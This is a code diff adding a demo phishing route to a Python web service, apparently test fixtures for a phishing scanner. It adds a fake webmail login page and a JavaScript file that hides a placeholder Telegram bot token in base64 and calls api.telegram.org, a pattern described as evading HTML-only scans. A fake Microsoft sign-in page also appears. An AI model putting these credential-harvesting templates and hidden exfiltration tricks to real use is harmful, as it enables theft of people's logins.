@@ -10,6 +10,7 @@ import hashlib
 import ipaddress
 import os
 import re
+from base64 import b64encode
 from pathlib import Path
 from urllib.parse import urlsplit
 
@@ -414,6 +415,25 @@ _AITM_LOGIN = ("<!doctype html><html><head><title>Sign in to your Microsoft acco
                "<form method='POST' action='#'><input type='email' name='login' placeholder='Email'>"
                "<input type='password' name='passwd' placeholder='Password'>"
                "<button>Sign in</button></form></div></body></html>")
+
+
+_JSEXFIL_TG = "7391827465:AAF1234567890abcdefghijklmnopqrstuv"   # valid shape: id + 35 chars
+_JSEXFIL_PAGE = ("<!doctype html><html><head><title>Sign in - Acme Webmail</title>" + _PHISH_CSS +
+                 "<script src='/demo-jsexfil/app.js'></script></head><body><div class='box'>"
+                 "<div class='logo'>Acme Mail</div><h1>Sign in</h1>"
+                 "<form method='POST' action='#'><input type='email' name='u' placeholder='Email'>"
+                 "<input type='password' name='p' placeholder='Password'><button>Sign in</button></form>"
+                 "</div></body></html>")
+# the exfil Telegram token lives ONLY in the external .js (base64) — invisible to an HTML-only scan
+_JSEXFIL_JS = ("var _c=atob('" + b64encode(('bot=' + _JSEXFIL_TG + ';chat=99887').encode()).decode() + "');"
+               "function ship(d){fetch('https://api.telegram.org/bot'+_c);}")
+
+
+@app.api_route("/demo-jsexfil/{page:path}", methods=["GET", "POST"])
+async def demo_jsexfil(page: str = ""):
+    if page.strip("/") == "app.js":
+        return Response(_JSEXFIL_JS, media_type="application/javascript")
+    return HTMLResponse(_JSEXFIL_PAGE)
 
 
 @app.api_route("/demo-aitm/{variant}", methods=["GET", "POST"])
